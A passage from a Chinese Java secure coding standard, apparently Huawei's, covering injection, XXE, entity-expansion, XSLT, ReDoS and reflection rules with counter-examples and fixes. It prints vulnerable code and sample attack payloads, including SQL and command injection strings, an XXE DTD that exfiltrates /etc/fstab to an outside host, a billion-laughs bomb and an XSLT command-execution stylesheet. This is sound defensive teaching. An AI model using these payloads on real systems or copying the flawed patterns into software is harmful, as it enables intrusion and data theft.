    String path = System.getProperty(RUNTIME_BASE_DIR);
    
    // 标准化
    // 校验，例如StringUtils.startsWith(path, "/opt/huawei/release/");
    // 使用
}
```

【反例】 配置文件未校验，直接使用。

```java
@Configuration
@PropertySource("classpath:xxx.properties")
@Component
public class XxxConfig {
    @Value("${appId}")
    private String appId;
    
    @Value("${secret}")
    private String citySecret;
}
```

【正例】

SpringBoot框架可以使用注解@ConfigurationProperties和@Validated完成对配置文件的校验，如下所示：

```java
@ConfigurationProperties(prefix = "xxx")
@Validated
public class XxxConfig {
    @Value("${appId}")
    @Pattern(regexp = "[0-9_A-Z]{32}")
    private String appId;
    
    @Value("${secret}")
    @Pattern(regexp = "[0-9A-Z]{64,138}", message = "Authentication credential error!")
    private String citySecret;
    
    // Setter和Getter方法
}
```

ServiceComb框架，可以通过Java自带的validation-api，从Bean上下文取到配置文件对象后，显式调用检验。

> G.EDV.01 禁止直接使用外部数据来拼接SQL语句

【级别】 要求

【描述】

SQL注入是指使用外部数据构造的SQL语句所代表的数据库操作与预期不符，这样可能会导致信息泄露或者数据被篡改。SQL注入产生的根本原因是使用外部数据直接拼接SQL语句，防护措施主要有以下三类：

- 使用参数化查询：最有效的防护手段，但对SQL语句中的表名、字段名等不适用；
- 对外部数据进行白名单校验：适用于拼接SQL语句中的表名、字段名；
- 对外部数据中的与SQL注入相关的特殊字符（参考附录A）进行转义：适用于必须通过字符串拼接构造SQL语句的场景，转义仅对由引号限制的字段有效。

参数化查询是一种简单有效的防止SQL注入的查询方式，应该被优先考虑使用。另外，参数化查询还能 提高数据库访问的性能，例如，SQL Server与Oracle数据库会为其缓存一个查询计划，以便在后续重复执行相同的查询语句时无需编译而直接使用。对于常用的ORM框架（如Hibernate、iBATIS等），同样支持参数化查询。

【反例】（字符串拼接）

```java
Statement stmt = null;
ResultSet rs = null;
try {
    String userName = request.getParameter("name");
    String password = request.getParameter("password");
    ...
    String sqlStr = "SELECT * FROM t_user_info WHERE name = '" + userName
    + "' AND password = '" + password + "'";
    stmt = connection.createStatement();
    rs = stmt.executeQuery(sqlString);
    ... // 结果集处理
} catch (SQLException ex) {
	// 处理异常
}
```

上述示例中，使用用户提交的用户名和密码构造SQL语句，验证用户名和密码信息是否匹配，通过字符 串拼接的方式构造SQL语句，存在SQL注入。恶意用户在仅知道用户名时，通过 `zhangsan' OR 'a' = 'a` 和**任意密码**的方式就能完成上述代码中的查询。

【正例】（使用PreparedStatement）

```java
PreparedStatement stmt = null;
ResultSet rs = null;
try {
    String userName = request.getParameter("name");
    String password = request.getParameter("password");
    ... // 确保userName和password的长度是合法的
    String sqlStr = "SELECT * FROM t_user_info WHERE name=? AND password =?";
    stmt = connection.prepareStatement(sqlStr);
    stmt.setString(1, userName);
    stmt.setString(2, password);
    rs = stmt.executeQuery();
    ... // 结果集处理
} catch (SQLException ex) {
	// 处理异常
}
```

参数化查询在SQL语句中使用占位符表示需在运行时确定的参数值，使得SQL查询的语义逻辑预先被定义，实际的查询参数值则在程序运行时再确定。参数化查询使得数据库能够区分SQL语句中语义逻辑和数据参数，以确保用户输入无法改变预期的SQL查询语义逻辑。如果攻击者输入userName为 `zhangsan' OR 'a' = 'a` ，该字符串仅会作为name字段的值来使用。

【正例】（转义）

```java
public List<Book> queryBooks(List<Expression> queryCondition) {
	...
    try {
        StringBuilder sb = new StringBuilder("select * from t_book where ");
        if (queryCondition != null && !queryCondition.isEmpty()) {
            Codec oe = new OracleCodec();
            for (Expression e : queryCondition) {
                String exprString = e.getColumn() + e.getOperator();
                String safeValue = HWEncoder.encodeForSQL(oe, e.getValue());
                sb.append(exprString).append("'").append(safeValue).append("' and ");
            }
            sb.append("1=1"); // 补全循环中最后一个and条件
            Statement stat = connection.createStatement();
            ResultSet rs = stat.executeQuery(sb.toString());
            ... // 其他代码
        }
    }
    ...
}
```

上述示例中，当必须使用外部数据来拼接SQL语句时，可以对外部数据进行转义处理。每种DBMS都有 其特定的转义机制，通过这种机制来告诉数据库此输入应该被当作数据，而不应该是代码逻辑。因此， 只要输入数据中的特殊字符被适当转义，就不会发生SQL注入问题。对于一些常用数据库中需要注意的 特殊字符，可参考 附录A SQL注入相关特殊字符。此示例代码使用了Huawei WSF安全框架提供的API进 行转义处理，WSF安全框架提供了针对常见数据库的转义API，推荐使用；另外也可以使用ESAPI组件中的API。对于转义，仅适用于SQL语句中由**单引号或双引号**限制的字段。

*注：如果传入的是字段名或者表名，应该使用白名单的方式进行校验。*

在存储过程中，通过拼接参数值来构建查询字符串，与在代码中通过拼接参数构造SQL语句一样，同样 存在SQL注入风险。

【反例】（在存储过程中动态构建SQL）

SQL Server存储过程：

```sql
CREATE PROCEDURE sp_queryItem
    @userName varchar(50),
    @password varchar(50)
AS
BEGIN
    DECLARE @sql nvarchar(500);
    SET @sql = 'SELECT * FROM t_user_info
                WHERE name= ''' + @userName + '''
                AND password= ''' + @password + '''';
    EXEC(@sql);
END
GO
```

上述示例中，在存储过程中，通过字符串拼接的方式构造SQL语句，存在SQL注入风险。

【正例】（在存储过程中使用参数化查询）

SQL Server存储过程：

```sql
CREATE PROCEDURE sp_queryItem
    @userName varchar(50),
    @password varchar(50)
AS
BEGIN
    SELECT * FROM t_user_info
    WHERE name = @userName
    AND password = @password;
END
GO
```

上述示例中，存储过程使用参数化查询。数据库编译此存储过程时，会生成一个SELECT查询的执行计划，只允许原始的SQL语义被执行，任何参数值都无法更改SQL语义。

> G.EDV.02 禁止直接使用外部数据构造格式化字符串

【级别】 要求

【描述】

Java中的Format可以将对象按指定的格式转为某种格式的字符串，格式化字符串可以控制最终字符串的 长度、内容、样式，当格式化字符串中指定的格式与格式对象不匹配时还可能会抛出异常。当攻击者可以直接控制格式化字符串时，可导致信息泄露、拒绝服务、系统功能异常等风险。

【反例】

```java
public String formatInfo(String formatStr) {
    String value = getData();
    return String.format(formatStr, value));
}

String formatStr = req.getParameter("format");
String formattedValue = formatInfo(formatStr);
```

上述示例中，直接使用外部指定的格式对字符串数据进行格式化，当外部指定的格式为非字符类型如%d，会导致格式化操作出现异常。

【正例】

```java
public String formatInfo() {
    String value = getData();
    return String.format("my format: %s", value);
}
```

上述示例中，格式化字符串不含外部数据。

> G.EDV.03 禁止直接向 `Runtime.exec()` 方法或 `java.lang.ProcessBuilder` 类传递外部数据

【级别】 要求

【描述】

`Runtime.exec()` 方法或 `java.lang.ProcessBuilder` 类被用来启动一个新的进程，在新进程中执行命令。命令执行通常会有两种方式：

- 直接执行具体命令： 例如 `Runtime.getRuntime().exec("ping 127.0.0.1")` ;
- 通过shell方式执行命令：windows下使用cmd.exe、linux下通过sh方式执行命令，或通过脚本文 件（`*.bat`/`*.sh`）执行命令。

直接使用外部数据构造命令行，会存在以下风险：

- shell方式执行命令时，需要命令行解释器对命令字符串进行拆分，该方式可执行多条命令，存在**命令注入**风险；
- 直接执行具体的命令时，可以通过空格、双引号或以 -/ 开头的字符串向命令行中注入参数，存在**参数注入**风险。

常见的注入场景如下：

**1、外部数据直接用于拼接shell方式的命令行**

【反例】

```java
String cmd = "cmd.exe /c dir " + path;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
...
```

上述示例中，使用外部数据构造shell方式的命令，存在命令注入风险。例如，当path的值为 “D:\test¬epad.exe”，实际会执行两个命令：“dir D:\test”和“notepad.exe”。

**2、外部数据用于构造命令数组中的某个值**

【反例】

```java
String[] cmds = new String[4];
cmds[0] = "cmd.exe";
cmds[1] = "/c";
cmds[2] = "ping";
cmds[3] = ip;

ProcessBuilder pb = new ProcessBuilder(cmds);
Process proc = pb.start();
...
```

上述示例中，使用外部数据构造shell方式的命令行数组，存在命令注入风险。例如，当ip的值为 “127.0.0.1&notepad.exe”，实际会执行两个命令：“ping 127.0.0.1”和“notepad.exe”。

**3、外部数据用于.bat/.sh脚本的参数**

【反例】

```java
String cmd = "test.bat " + ip;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
```

上述示例中，外部数据与脚本文件名拼接构造命令行，存在命令注入风险。例如，当ip的值为 “127.0.0.1&notepad.exe”，实际会执行两个命令：“test.bat 127.0.0.1”和“notepad.exe”。

**4 、外部数据用于构造非shell方式的命令行**

【反例】

```java
String cmd = "ping" + ip;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
```

上述示例中，使用外部数据构造非shell命令行，存在参数注入风险。例如，当ip的值为“ 127.0.0.1 -t”的 时候，会向实际执行的命令中注入参数“-t”，导致ping进程持续执行。

针对命令注入或参数注入，具体的解决方案如下：

**1、避免直接执行命令**

对于Java的标准库或开源组件已经提供的功能，应使用标准库或开源组件的API，避免执行命令。

如果无法避免执行命令，则必须要对外部数据进行检查和过滤，要过滤的字符参考 附录B 命令注入相关特殊字符。

**2、对外部数据进行校验**

外部数据用于拼接命令行时，可使用白名单方式对外部数据进行校验，保证外部数据中不含注入风险的特殊字符。

【正例】（数据校验）

```java
...
// str值来自用户输入
if (!Pattern.matches("[0-9A-Za-z@]+", str)) {
	// 处理错误
}
...
```

**3、对外部数据中存在命令注入风险的特殊字符进行转义**

在执行命令行时，如果输入校验不能禁止有风险的特殊字符，需先外部输入进行转义处理，转义后的字段拼接命令行可有效防止命令注入的产生。对于转义的API，推荐使用Huawei WSF安全框架中的API， 另外也可以使用业界开源组件esapi中的API。

【正例】（转义）

```java
String encodeIp = HWEncoder.encodeForOS(new WindowsCodec(), ip);
String cmd = "cmd.exe /c ping " + encodeIp;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
...
```

上述示例中，外部数据在拼接shell命令行前，先对其中的特殊字符进行了转义处理，可有效消减命令注入风险。

说明：正确的转义处理只是针对外部输入，而不是拼接后的完整命令行。转义方式只针对命令注入有效，对于参数注入无效。

> G.EDV.04 禁止直接使用外部数据来拼接XML

【级别】 要求

【描述】 使用未经校验的数据来构造XML会导致XML注入漏洞。如果用户被允许输入结构化的XML片段，则用户 可以在XML的数据域中注入XML标签来改写目标XML文档的结构和内容，XML解析器会对注入的标签进 行识别和解释，引起注入问题。

【反例】

```java
private void createXMLStream(BufferedOutputStream outStream, User user) throws IOException {
    String xmlString;
    xmlString = "<user><role>operator</role><id>" + user.getUserId()
    	+ "</id><description>" + user.getDescription() + "</description></user>";
    ... // 解析xml字符串
}
```

上述示例中，当恶意用户使用 `joe</id><role>administrator</role><id>joe` 作为用户ID，使用正常的输入 `I want to be an administrator` 作为描述字段。最终构造出的整个XML字符串将变成如下形式：

```xml
<user>
    <role>operator</role>
    <id>joe</id>
    <role>administrator</role>
    <id>joe</id>
    <description>I want to be an administrator</description>
</user>
```

当使用SAX解析器解析该XML字符串时，由于SAX解析器（org.xml.sax and javax.xml.parsers.SAXParser）在解释XML文档时会将第二个role域的值覆盖前一个role域的值，因此 会导致此用户角色由操作员提升为了管理员。

【反例】（XML Schema或者DTD校验）

```java
private void createXMLStream(BufferedOutputStream outStream, User user) throws IOException {
    String xmlString;
    xmlString = "<user><id>" + user.getUserId()
        + "</id><role>operator</role><description>" + user.getDescription()
        + "</description></user>";
    
    StreamSource xmlStream = new StreamSource(new StringReader(xmlString));
    
    // 创建一个使用schema执行校验的SAX解析器
    SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
    StreamSource ss = new StreamSource(new File("schema.xsd"));
    try {
        Schema schema = sf.newSchema(ss);
        Validator validator = schema.newValidator();
        validator.validate(xmlStream);
    } catch (SAXException ex) {
        throw new IOException("Invalid userId", ex);
    }
    
    // XML是有效的, 进行处理
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

如下是schema.xsd文件中的schema定义：

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="user">
        <xs:complexType>
        <xs:sequence>
            <xs:element name="id" type="xs:string"/>
            <xs:element name="role" type="xs:string"/>
            <xs:element name="description" type="xs:string"/>
        </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

当恶意用户使用`joe</id><role>Administrator</role><!--`作为用户ID，使用 `--<description>I want to be an administrator` 作为描述字段。最终构造出的整个XML字符串将变成如下形式：

```xml
<user>
    <id>joe</id>
    <role>Administrator</role><!--</id> <role>operator</role> <description> -->
    <description>I want to be an administrator</description>
</user>
```

用户ID结尾处的 `<!--` 和描述字段开头处的 `-->` 将会注释掉原本硬编码在XML字符串中的角色信息。虽然 用户角色已经被恶意用户篡改成管理员类型，但是整个XML字符串仍然可以通过schema的校验。XML schema或者DTD校验仅能确保XML的格式是有效的，而恶意用户可以在不打破原有XML格式的情况 下，对XML的内容进行篡改。

【正例】（白名单校验）

```java
private void createXMLStream(BufferedOutputStream outStream, User user) throws IOException {
    // 仅当userID只包含字母、数字和下划线时写入XML字符串
    if (!Pattern.matches("[_a-bA-B0-9]+", user.getUserId())) {
        // 处理错误
    }
    if (!Pattern.matches("[_a-bA-B0-9]+", user.getDescription())) {
        // 处理错误
    }
    String xmlString = "<user><id>" + user.getUserId()
        + "</id><role>operator</role><description>"
        + user.getDescription() + "</description></user>";
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

上述示例中，使用白名单的方式对外部数据进行校验，要求输入的userId中只能包含字母、数字或者下划线。

【正例】（使用安全的XML库）

```java
public static void buidlXML(FileWriter writer, User user) throws IOException {
    Document userDoc = DocumentHelper.createDocument();
    Element userElem = userDoc.addElement("user");
    Element idElem = userElem.addElement("id");
    idElem.setText(user.getUserId());
    Element roleElem = userElem.addElement("role");
    roleElem.setText("operator");
    Element descrElem = userElem.addElement("description");
    descrElem.setText(user.getDescription());
    XMLWriter output = null;
    try {
        OutputFormat format = OutputFormat.createPrettyPrint();
        format.setEncoding("UTF-8");
        output = new XMLWriter(writer, format);
        output.write(userDoc);
        output.flush();
    } finally {
        // 关闭流
    }
}
```

上述示例中，使用Dom4j来构建XML，Dom4j是一个定义良好、开源的XML工具库。Dom4j会对文本数 据域进行XML编码，从而使得XML的原始结构和格式免受破坏。当恶意用户使用 `joe</id><role>Administrator</role><!--`作为用户ID，使用 `--<description>I want to be an administrator` 作为描述字段。最终成如下格式的XML：

```xml
<user>
    <id>joe&lt;/id&gt;&lt;role&gt;Administrator&lt;/role&gt;&lt;!--</id>
    <role>operator</role>
    <description>--&gt;&lt;description&gt;I want to be an administrator</description>
</user>
```

可以看到，“<”与“>”经过XML转义后分别被替换成了“<”与“>”，导致恶意用户未能将其角色类型从操作员提升到管理员。

【正例】（转义）

```java
private void createXMLStream(BufferedOutputStream outStream, User user) throws IOException {
	...
    String encodeUserId = HWEncoder.encodeForXML(user.getUserId());
    String encodeDec = HWEncoder.encodeForXML(user.getDescription());
    
    String xmlString = "<user><id>" + encodeUserId
        + "</id><role>operator</role><description>" + encodeDec
        + "</description></user>";
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

上述示例中，对外部数据在拼接XML字符串前进行了转义处理，然后再构造XML字符串，这样不会导致 XML字符串结构被篡改。转义API可使用Huawei WSF安全框架或业界开源组件esapi提供的API。该示例 中调用的是Huawei WSF安全框架中的API。

> G.EDV.05 防止解析来自外部的XML导致的外部实体（XML External Entity）攻击

【级别】 要求

【描述】

在XML的中的DTD（文档类型定义）中可以定义实体，实体可以分为内部实体（实体对应的内容在本 XML中明确给出）和外部实体（实体指向了XML外部的资源，一般使用URI来指定）。XML解析时首先会处理实体，获取外部实体实际指向资源的内容（例如当实体指向某个文件时，解析XML时会首先读取该文件，将文件中的内容与实体进行关联），然后将XML中对实体的引用替换为实体所代表的内容。

当系统处理来自外部的XML时，就容易受到外部实体（XML External Entity）攻击。恶意用户通过将 XML中的外部实体指向含敏感信息的文件、系统内部接口、恶意网站等，对系统造成任意文件读取、内网端口扫描、内网网站攻击、DoS攻击等恶意攻击行为。下面给出两个具体的外部实体攻击利用示例：

1.  利用外部实体的引用功能实现任意文件的读取： 

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
	<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]>
<updateProfile>
    <firstname>Joe</firstname>
    <lastname>&file;</lastname>
    ...
</updateProfile>
```

2. 使用参数实体和`<CDATA[]>`避免XML解析语法错误，构造恶意的实体解析：
   XML文件：构造参数实体 % start；% goodies；% end；% dtd定义一个恶意的combine.dtd 

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % goodies SYSTEM "file:///etc/fstab">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://evil.example.com/combine.dtd">
    %dtd;
    ]>
<roottag>&all;</roottag>
```

恶意DTD：combine.dtd中定义实体&all;

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```

甚至可以这样构造恶意的combine.dtd，将结果发送到目标地址，最后会获得file:///etc/fstab文件。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % send "<!ENTITY all SYSTEM 'http://mywebsite.com/?%gooddies;'>">
%send;
```

针对外部实体（XML External Entity）攻击，有效的防护措施包括以下三种：

- **禁止处理XML中的实体**：最安全的防护措施；
- **禁止处理XML中的外部实体**：当需要使用内部实体时，只禁用外部实体；
- **对外部实体进行白名单校验**：确实需要使用外部实体时，对外部实体指向的资源进行白名单校验。

针对这些防护措施，后面以 `DocumentBuilderFactory` 为例进行详细说明。由于Java中XML解析的实现方式比较多，针对各种XML解析方式防护措施本规范不一一列举。

另外，对于“JAXB Unmarshaller”、“XPathExpression”等无法禁止XML实体解处理的XML处理方式，为了消除XXE攻击，可以使用其他支持禁止XML实体处理的XML处理方式对XML进行预处理。

【反例】

```java
private void parseXmlFile(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，解析XML文件时未进行安全防护，当解析的XML文件是恶意用户精心构造的，系统会受到 XXE攻击。

【正例】（禁止解析DTDs）

```java
private void parserXmlFileDisableDtds(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，设置禁止解析DTDs的属性，有效避免了利用XML实体进行的各种攻击。

【正例】（禁止解析外部一般实体和外部参数实体）

```java
private void parserXmlFileDisableExternalEntityes(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，设置了禁止解析外部实体的属性，能防止外部实体（XXE）攻击，但不能防止XML内部实体类攻击。

【正例】（对外部实体指向的资源进行白名单校验）

```java
private static void parserXmlFileValidateEntities(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        db.setEntityResolver(new ValidateEntityResolver());
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}

class ValidateEntityResolver implements EntityResolver {
    private static final String GOOD_ENTITY = "file:/Users/onlinestore/good.xml";
    public InputSource resolveEntity(String publicId, String systemId)
        throws SAXException, IOException {
        if (publicId != null && publicId.equals(GOOD_ENTITY)) {
            return new InputSource(publicId);
        } else if (systemId != null && systemId.equals(GOOD_ENTITY)) {
            return new InputSource(systemId);
        } else {
            return new InputSource();
        }
    }
}
```

上述示例中，定义一个CustomResolver类来实现接口 `org.xml.sax.EntityResolver` ，在这个类中实 现自定义的处理外部实体机制。使用白名单机制对外部实体进行校验，当外部实体在白名单范围内时正 常访问实体，否则返回一个空的实体内容。

当系统中涉及的XML操作中必须使用外部实体时，必须对外部实体指向的资源进行白名单校验。具体的 校验方式如上述代码，自定义一个 `ValidateEntityResolver` 类（实现接口 `org.xml.sax.EntityResolver` ），在 `resolveEntity` 方法中对XML中引入的实体指向的资源进行白 名单校验，拒绝解析非白名单中的外部实体资源。

【例外】

Android的SDK中，原生XML解析器在解析XML时不涉及实体解析，不需要进行特殊防护。

> G.EDV.06 防止解析来自外部的XML导致的内部实体扩展（XML Entity Expansion）攻击

【级别】 要求

【描述】

XML内部实体格式：`<!ENTITY 实体名 "实体的值"\>`。内部实体攻击比较常见的是XML Entity Expansion攻击，它主要试图通过消耗目标程序的服务器内存资源导致DoS攻击。例如，解析下面的 XML时，因为内部实体lol9是一个非常大的字符串，所以解析 `<lolz>` 节点时，会占用大量服务器内存资源，导致拒绝服务攻击。

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
	]>
<lolz>&lol9;</lolz>
```

内部实体扩展攻击**最好的防护措施是禁止DTDs的解析**，如果必须使用内部实体时，也可以对内部实体数量进行限制，以消减内部实体扩展攻击发生的可能性。

【正例】（禁止解析DTDs）

```java
public void receiveXMLStream(InputStream inStream) throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

【正例】（通过系统属性限制实体数量）

```java
public void receiveXMLStream(InputStream inStream) throws ParserConfigurationException, SAXException, IOException {
    // 使用系统属性限制
    System.setProperty("entityExpansionLimit", "200");
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

上述示例中，通过设置系统属性限制解析实体数量不超过200。

备注：系统属性 `entityExpansionLimit` 在JDK 7u45+、JDK 8版本中支持。JAXP中的SAX和StAX类型解析器同样生效。

【正例】（限制实体数量）

```java
public void receiveXMLStream(InputStream inStream) throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setAttribute("http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit", "200");
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

Java中的JAXP解析器默认限制实体解析数量是64,000个，但通常不会需要解析这么多的实体，可以进一步限制实体数量。上述示例中，通过设置DOM解析器的属性限制解析的内部实体数量上限为200。

备注：属性 `http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit` 在JDK 7u45+、JDK 8版本中支持。JAXP中的SAX和StAX类型解析器不支持该属性。

说明：XML解析器种类较多，规范不能一一列举。当程序涉及到外部XML数据的解析操作时，可参考正例中的配置项进行防护，并充分验证防护配置是否能正常生效。

【例外】

Android的SDK中，原生XML解析器在解析XML时不涉及实体解析，不需要进行特殊防护。

> G.EDV.07 禁止使用不安全的XSLT转换XML文件

【级别】 要求

【描述】

XSLT是一种样式转换标记语言，可以将XML数据转换为另外的XML或其他格式，如HTML网页，纯文字。因为XSLT的功能十分强大，可以导致任意代码执行，当使用TransformerFactory转换XML格式数 据的时候，需要添加安全策略禁止不安全的XSLT代码执行。

【反例】

```java
public void XsltTrans(String src, String dst, String xslt) {
    // 获取转换器工厂
    TransformerFactory tf = TransformerFactory.newInstance();
    try {
        // 获取转换器对象实例
        Transformer transformer = tf.newTransformer(new StreamSource(xslt));
        // 进行转换
        try (FileOutputStream fos = new FileOutputStream(dst)) {
            transformer.transform(new StreamSource(src), new StreamResult(fos));
        }
        ...
    } catch (TransformerException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，xslt没有做任何限制，直接调用，当执行类似如下XSLT代码的时候，会导致命令执行漏洞：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="java">
    <xsl:template match="/" xmlns:os="java:lang.Runtime" >
        <xsl:variable name="runtime" select="java:lang.Runtime.getRuntime()"/>
        <xsl:value-of select="os:exec($runtime, 'calc')" />
    </xsl:template>
</xsl:stylesheet>
```

【正例】

```java
public void xsltTrans(String src, String dst, String xslt) {
    // 获取转换器工厂
    TransformerFactory tf = TransformerFactory.newInstance();
    try {
        // 转换器工厂设置黑名单，禁用一些不安全的方法，类似XXE防护
        tf.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);
        // 获取转换器对象实例
        Transformer transformer = tf.newTransformer(new StreamSource(xslt));
        // 去掉<?xml version="1.0" encoding="UTF-8"?>
        transformer.setOutputProperty("omit-xml-declaration", "yes");
        // 进行转换
        try (FileOutputStream fos = new FileOutputStream(dst)) {
            transformer.transform(new StreamSource(src), new StreamResult(fos));
        }
        ...
    } catch (TransformerException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，在TransformerFactory中开启了安全防护策略。Java对xslt内置了黑名单，通过将 `http://javax.xml.XMLConstants/feature/secure-processing` 属性设置为true开启防护，可以禁用一些不安全的方法。

> G.EDV.08 正则表达式要尽量简单，防止ReDos攻击

【级别】 要求

【描述】

ReDos攻击是正则编写不当导致的常见安全风险。Java中的正则匹配使用的是NFA引擎。NFA引擎的回溯机制，导致当字符串文本与正则表达式不匹配时，所花费的时间要比匹配时多，即要确定匹配失败， 需要与所有可能的路径进行对比匹配，证明都不匹配时，才返回匹配失败。当使用简单的非分组正则表达式时，一般不会存在ReDos攻击。容易存在ReDos攻击的正则表达式主要有两类：

1. 包含具有自我重复的重复性分组的正则，例如：

```
^(\d+)+$
^(\d*)*$
^(\d+)*$
^(\d+|\s+)*$
```

2. 包含替换的重复性分组，例如：

```
^(\d|\d|\d)+$
^(\d|\d?)+$
```

对于ReDos攻击的防护手段主要包括：

- 进行正则匹配前，先对匹配的文本的长度进行校验；
- 在编写正则时，尽量不要使用过于复杂的正则，尽量少用分组；
- 避免动态构建正则，当使用外部数据构造正则时，要使用白名单进行严格校验。

【反例】

```java
private static final Pattern REGEX_PATTERN = Pattern.compile("a(b|c+)+d");
    
public static void main(String[] args) {
    ...
    Matcher matcher = REGEX_PATTERN.matcher(args[0]);
    if (matcher.matches()) {
        ...
    } else {
        ...
    }
    ...
}
```

上述示例中，正则表达式 `a(b|c+)+d` 存在ReDos风险，当匹配的字符串格式类 似"accccccccccccccccx"时，随中间的字符"c"的增加，代码执行时间将成指数级增长。

【正例】

```java
private static final Pattern REGEX_PATTERN = Pattern.compile("a[bc]+d");

public static void main(String[] args) {
    ...
        Matcher matcher = REGEX_PATTERN.matcher(args[0]);
    if (matcher.matches()) {
        ...
    } else {
        ...
    }
    ...
}
```

上述示例中，将正则表达式精简为 `a[bc]+d` 。与 `a(b|c+)+d` 相比，可以在实现相同功能的前提下消除 ReDos风险。

【反例】

```java
String key = request.getParameter("keyword");
...
String regex = "[a-zA-Z0-9_-]+@" + key + "\\.com";
Pattern searchPattern = Pattern.compile(regex);
...
```

> G.EDV.09 禁止直接使用外部数据作为反射操作中的类名/方法名

【级别】 要求

【描述】

反射操作中直接使用外部数据作为类名或方法名，会导致系统执行非预期的逻辑流程（Unsafe Reflection）。这可被恶意用户利用来绕过安全检查或执行任意代码。当反射操作需要使用外部数据 时，必须对外部数据进行白名单校验，明确允许访问的类或方法列表；另外也可以通过让用户在指定范 围内选择的方式进行防护。

【反例】

```java
String className = request.getParameter("class");
...
Class objClass = Class.forName(className);
BaseClass obj = (BaseClass) objClass.newInstance();
obj.doSomething();
```

上述示例中，直接使用外部指定的类名通过反射构造了一个对象，恶意用户可利用此处构造一个任意的 `BaseClass` 子类的对象，当恶意用户可控制 `BaseClass` 的某个子类时，则可在该子类的 `doSomething()`方法中执行任意代码。另外恶意用户还可以利用此代码执行任意类的默认构造方法， 即使在进行类型转换时抛出 `ClassCastException` ，恶意用户预期的构造方法中的代码也已经执行。

【正例】

```java
String classIndex = request.getParameter("classIndex");
String className = (String) reflectClassesMap.get(classIndex);
if (className != null) {
    Class objClass = Class.forName(className);
